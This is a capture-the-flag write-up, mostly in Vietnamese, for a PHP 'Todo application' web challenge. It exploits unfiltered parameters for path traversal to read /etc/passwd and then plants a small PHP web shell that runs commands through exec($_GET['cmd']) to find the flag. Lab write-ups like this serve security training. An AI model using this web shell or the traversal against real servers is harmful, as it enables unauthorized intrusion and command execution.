# Todo application:
Link: https://battle.cookiearena.org/challenges/web/todo-application

## Challenge Details
All your work will be saved to a checklist in the todo.txt file. Can a PHP Web Shell be created on this server? Could you try and read FLAG?

> Flag Location: /flagXXXX.txt\
> Flag Format: CHH{XXX}\
> Credits: YesWeHack

## B1: Kiểm tra tổng quan
- Truy cập vào đường dẫn:\
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/ce9e8854-3685-471a-9e21-051f57221d29)\
- Kiểm tra thử đầu vào: abc\
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/2203a601-2658-4254-a9d7-5d053a7be4df)\
- Ta quan sát thấy và rằng xuất hiện 2 parameter ?add và &fileTodo (trang web nhận đầu vào người dùng đưa vào và hiển thị nội dung nên có thể khai thác được path tranversal hoặc RCE)

## B2: Phân tích code
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/251b6f18-c25e-4521-8f1c-701ffdd787ac)\
- File mặc định là todo.txt và phần nội dung thêm vào là input của người dùng.\
- 2 parameter ?add và &fileTodo cho phép người dùng nhập mà không thực hiện kiểm tra bất kì thông tin gì, hay filter để lọc đầu vào của người dùng-> check chèn shell code và check path traversal.

## B3: Path traversal
- Ta tìm thấy file /etc/passwd
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/557a8000-55b5-495b-b461-83b64ca9d12c)

## B4: check upload file
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/270bf360-faa7-4ab0-b52a-29aab60ffcd8)
- Nội dung file hiển thị ở:
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/df906778-638a-4095-bcf3-999e9ae996fa)
=> RCE
- Tạo file php có nội dung như sau:
```
<? phpinfo();?>
```
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/a9d8b483-a6f7-4964-9ffa-d3f56a713e30)
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/918b1238-983f-44fe-bcbb-f30e703baa7e)
- Xem file php info ta thấy các hàm bị disable:xec,system,passthru,readfile,shell_exec,escapeshellarg,escapeshellcmd,proc_close,proc_open,ini_alter,dl,popen,parse_ini_file,show_source,curl_exec\
- Ta tạo 1 payload như sau:
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="100">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
      $a= exec($_GET['cmd']);
    }
    echo($a);
?>
</pre>
</body>
</html>
```
- Thực hiện encode:
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/9c503b82-82b5-4c15-9fbe-e31aa43cf94c)
 
- Kiểm tra trên browser:
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/3dde6109-5f78-424d-bafc-d162d9e09b14)
- Tìm file flag:
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/b2fc2882-fffd-468b-a42f-29134885f06f)
![image](https://github.com/minhngoc9119/WEB_CTF/assets/34714073/d69e61ef-ba24-4417-84ed-f9862a1febf8)

- 
